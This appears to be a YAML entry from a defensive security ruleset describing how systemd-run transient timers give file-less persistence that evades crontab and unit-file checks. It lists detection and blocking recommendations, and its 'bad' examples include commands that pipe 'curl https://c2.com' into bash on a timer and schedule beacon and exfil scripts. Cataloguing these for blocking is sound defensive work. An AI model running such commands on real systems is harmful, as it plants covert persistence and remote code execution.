id: "persistence-evasion/transient-persistence/systemd-run-timer"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Transient Systemd Persistence"
category_id: "6.11"
name: "systemd Transient Timer Scheduling"
risk_level: "high"

abstract: |
  Using systemd-run with --on-calendar or similar timer options to create in-memory
  scheduled tasks that function like cron without writing any files, completely bypassing
  crontab and unit file detection. Transient timers survive until user logout and can
  schedule repeated payload execution.

explanation: |
  systemd-run supports timer specifications that create in-memory scheduled execution:

  ```
  systemd-run --on-calendar='*:0/15' /tmp/beacon.sh
  systemd-run --on-active=5min /tmp/payload.sh
  systemd-run --on-boot=10min sh -c 'curl https://c2.com | bash'
  systemd-run --user --on-calendar='hourly' /tmp/exfil.sh
  ```

  Timer flag reference:
  - `--on-calendar=SPEC` — cron-like calendar expression
  - `--on-active=TIMESPAN` — run after TIMESPAN from now
  - `--on-boot=TIMESPAN` — run TIMESPAN after system boot
  - `--on-unit-active=TIMESPAN` — run TIMESPAN after last activation

  This is distinct from cron persistence because:
  - No crontab entry is created — `crontab -l` shows nothing
  - No unit file is written — scanning /etc/systemd/ or ~/.config/systemd/ shows nothing
  - `systemctl list-timers` will show the transient timer during runtime
  - Survives until logout; if triggered during session, can establish persistent C2 before logout

  The `--on-calendar='*:0/15'` pattern creates a 15-minute interval beacon that
  checks in with a C2 server repeatedly during a development session.

recommendation: |
  - Block systemd-run with any timer flags (--on-calendar, --on-active, --on-boot,
    --on-unit-active, --on-unit-inactive).
  - Include `systemctl list-timers --all` in security monitoring.
  - Alert on transient timer creation events in audit logs.
  - Treat all timer-based systemd-run as equivalent to cron persistence.

examples:
  bad:
    - "systemd-run --on-calendar='*:0/15' /tmp/beacon.sh"
    - "systemd-run --user --on-active=5min /dev/shm/payload"
    - "systemd-run --on-calendar='hourly' sh -c 'curl https://c2.com | bash'"
  good:
    - "systemd-run --on-active=30s --scope /usr/bin/make test"

